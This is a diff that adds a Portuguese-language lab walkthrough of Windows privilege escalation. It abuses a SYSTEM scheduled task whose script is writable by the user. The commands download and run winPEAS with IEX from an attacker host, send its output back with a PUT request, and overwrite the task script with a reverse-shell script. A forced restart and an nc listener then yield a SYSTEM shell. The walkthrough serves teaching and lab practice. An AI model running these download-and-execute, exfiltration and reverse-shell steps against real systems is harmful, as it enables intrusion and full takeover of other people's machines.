@@ -97,3 +97,196 @@ O código PowerShell embutido na macro estabelece uma conexão TCP reversa para 
 
 Este tipo de técnica é comum em ataques fileless, pois evita gravações em disco e contorna políticas de execução do PowerShell.
 
+ <br/>
+    <br/>
+
+## 🧪 Fase 2 — Escalada de Privilégios Local
+
+Após o acesso inicial, o próximo objetivo foi escalar privilégios para obter controlo total do sistema como **NT AUTHORITY\SYSTEM**.  
+Esta fase consistiu na **descoberta e exploração de uma tarefa agendada mal configurada**, permitindo a execução de código com permissões elevadas.
+
+---
+
+### 1. Preparação do Ambiente de Investigação
+
+Foi criado um servidor de upload/download em Python na máquina atacante para facilitar a transferência de ficheiros entre as máquinas:
+
+```bash
+python3 upload_server.py
+# [+] Serving HTTP upload/download server at port 8080
+```
+
+---
+
+### 2. Execução do WinPEAS e Exfiltração do Output
+
+Na shell da vítima, foi executado o `winPEASps1.ps1`, e a saída foi guardada num ficheiro `.txt`:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.205:8080/winPEASps1.ps1') | Out-File "$env:USERPROFILE\Downloads\winpeas.txt" -Encoding ASCII
+```
+
+Em seguida, o ficheiro foi exfiltrado para a máquina do atacante:
+
+```powershell
+Invoke-RestMethod -Uri "http://192.168.1.205:8080/winpeas.txt" -Method PUT -InFile "C:\Users\jsilva\Downloads\winpeas.txt"
+```
+
+<p align="center">
+    <br/>
+    <br/>
+      <img src="https://github.com/user-attachments/assets/d11db3f6-816b-45a4-b7a7-11ef05ae2246" height="60%" width="60%"/>
+    <br/>
+    <br/>
+    <img src="https://github.com/user-attachments/assets/1cd6ede9-e275-484c-9a32-ac27e3fbdcac" height="60%" width="60%"/>
+    <br/>
+    <br/>
+<p/>
+
+
+
+---
+
+### 3. Análise do Output do WinPEAS
+
+Na máquina atacante, o output foi segmentado por tarefas agendadas:
+
+```bash
+awk '
+/^TaskName:/ {
+    ++i;
+    f = sprintf("task_%03d.txt", i);
+}
+f { print > f }
+' winpeas.txt
+```
+
+<p align="center">
+    <br/>
+    <br/>
+      <img src="https://github.com/user-attachments/assets/1dacf129-6f1a-4b05-8fcb-f7febbe8d0bb" height="60%" width="60%"/>
+    <br/>
+    <br/>
+<p/>
+    
+
+Depois, filtrou-se por tarefas que correm como `SYSTEM`:
+
+```bash
+grep -l "Run As User: *SYSTEM" task_*.txt > SYSTEM_tasks.txt
+```
+
+E procuraram-se scripts suspeitos:
+
+```bash
+grep -Ei "ps1|bat|cmd|exe" $(cat SYSTEM_tasks.txt) | grep -i "task to run"
+```
+<p align="center">
+    <br/>
+    <br/>
+      <img src="https://github.com/user-attachments/assets/845d809a-25e0-4a1a-b050-028f2f5db977" height="60%" width="60%"/>
+    <br/>
+    <br/>
+<p/>
+
+
+Foi identificado o seguinte comando crítico:
+
+```text
+task_012.txt:Task To Run: powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\TempTask\svc_launcher.ps1
+```
+
+Lendo o conteudo de **task_012.txt** conseguimos obter a informação mais completa sobre a tarefa.
+
+<p align="center">
+    <br/>
+    <br/>
+      <img src="https://github.com/user-attachments/assets/c523e3eb-39da-4398-b588-4091550ed2bf" height="60%" width="60%"/>
+    <br/>
+    <br/>
+<p/>
+    
+
+---
+
+### 4. Verificação de Permissões
+
+Foi verificado que o utilizador comprometido (`jsilva`) tinha permissões de **controlo total** sobre o ficheiro `.ps1` usado pela tarefa:
+
+```powershell
+icacls C:\TempTask\svc_launcher.ps1
+```
+<p align="center">
+    <br/>
+    <br/>
+      <img src="https://github.com/user-attachments/assets/875ef2f9-e9af-465e-b1c8-45014cca5b24" height="60%" width="60%"/>
+    <br/>
+    <br/>
+<p/>
+
+
+Saída relevante:
+
+```
+PILAO\jsilva:(I)(F)          → Full control — pode sobrescrever este ficheiro
+NT AUTHORITY\SYSTEM:(I)(F)   → A tarefa agendada corre o script como SYSTEM
+```
+
+---
+
+### 5. Substituição do Script e Execução da Tarefa
+
+Foi feito o upload de um **script malicioso** com reverse shell, substituindo o original:
+
+```powershell
+powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.168.1.205:8080/svc_launcher.ps1' -OutFile 'C:\TempTask\svc_launcher.ps1'"
+```
+
+<p align="center">
+    <br/>
+    <br/>
+      <img src="https://github.com/user-attachments/assets/4d36fb25-f3e4-47c3-b7c3-4efe2c2cf370" height="60%" width="60%"/>
+    <br/>
+    <br/>
+<p/>
+
+
+Como a tarefa era configurada para correr ao arrancar o sistema, pode-se esperar que a maquina a vitima inicie a máquina mas como tratasse de um laboratório forçou-se o reinício:
+
+```powershell
+Restart-Computer -Force
+```
+
+---
+
+### 6. Resultado — Shell como SYSTEM
+
+Na máquina atacante, aguardou-se ligação à porta 4444:
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+Após o reinício da vítima:
+
+<p align="center">
+    <br/>
+    <br/>
+      <img src="https://github.com/user-attachments/assets/448ad18a-e3b8-4bee-b28b-f0d69decd94f" height="60%" width="60%"/>
+    <br/>
+    <br/>
+<p/>
+
+
+
+
+A escalada foi bem-sucedida! O atacante obteve **acesso completo com privilégios SYSTEM**.
+
+---
+
+### Resumo
+
+A má configuração de permissões num script chamado por uma tarefa agendada como SYSTEM foi explorada com sucesso para **escalar privilégios localmente**.
+
+A utilização do `winPEAS` permitiu descobrir a vulnerabilidade, a análise de permissões confirmou a possibilidade de exploração, e a substituição do script permitiu ganhar **controlo total do sistema**, com acesso **persistente**.
+
